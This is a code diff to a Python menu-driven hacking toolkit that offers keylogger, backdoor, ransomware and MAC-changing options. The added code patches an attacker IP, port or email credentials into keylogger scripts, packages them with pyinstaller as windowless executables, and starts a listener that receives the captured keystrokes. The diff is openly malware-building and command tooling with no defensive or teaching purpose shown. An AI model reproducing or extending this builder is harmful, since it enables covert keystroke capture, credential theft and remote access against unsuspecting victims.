@@ -3,6 +3,7 @@ from Change_mac import mac
 import os
 import subprocess as sb
 from Listener import listener
+from Keylogger import keyloggerlistener
 import re
 
 
@@ -17,9 +18,9 @@ a = """
 6-)Keyloger from ip
 7-)Backdoor
 8-)connection console
-9-)Ransomware
+9-)Ransomware !!!(not for now)!!!
 10-)Changemac
-11-)Backdoor
+11-)Keylogger Listener
 example: use 1
 
 """
@@ -54,6 +55,17 @@ def sniff():
     sniffing = packet_sniffing.NetScan()
     sniffing.sniff(iface)
 
+def Keyloogger_ip():
+    ip = input("enter ip adress: ")
+    port = input("enter port: ")
+    with open("Keylogger/keyloggersocket.py","r") as file:
+        a=file.read()
+        a=a.replace("0.0.0.0",ip)
+        a=a.replace("4444",port)
+    with open("Keylogger/keyloggersocket.py","w") as file:
+        file.write(a)
+    sb.call(["pyinstaller","--onefile","-w","Keylogger/keyloggersocket.py"])
+
 def Backdoor():
     ip = input("enter ip adress: ")
     port = input("enter port: ")
@@ -66,15 +78,20 @@ def Backdoor():
     sb.call(["pyinstaller","--onefile","-w","Bacdoor/Backdoor.py"])
     
 def keylogger():
+    mail = input("enter your mail adress: ")
+    password = input("enter your mail password: ")
+    with open("Keylogger/keylogger.py","r") as file:
+        a = file.read()
+        a=a.replace("mail",mail)
+        a=a.replace("psw",password)
+    with open("Keylogger/keylogger.py","w") as file:
+        file.write(a)
     sb.call(["pyinstaller","--onefile","-w","keylogger.py"])
 
-def test():
-    with open("test.txt","r") as file:
-        a =file.read()
-        a=a.replace("iyim","ip")
-    with open("test.txt","w") as file:
-        file.write(a)
-
+def Keylog_listen():
+    ip = input("enter ipadress: ")
+    port = input("enter port number: ")
+    keyloggerlistener.listen(ip,port) 
 
 while True:
     print(a)
@@ -82,6 +99,10 @@ while True:
     try:
         if  user_input == 'use 9':
             change_mac()
+        elif user_input == 'use 11':
+            Keylog_listen()
+        elif user_input == 'use 6':
+            Keyloogger_ip()
         elif user_input == 'use 7':
             Backdoor()
         elif user_input == 'use 3':
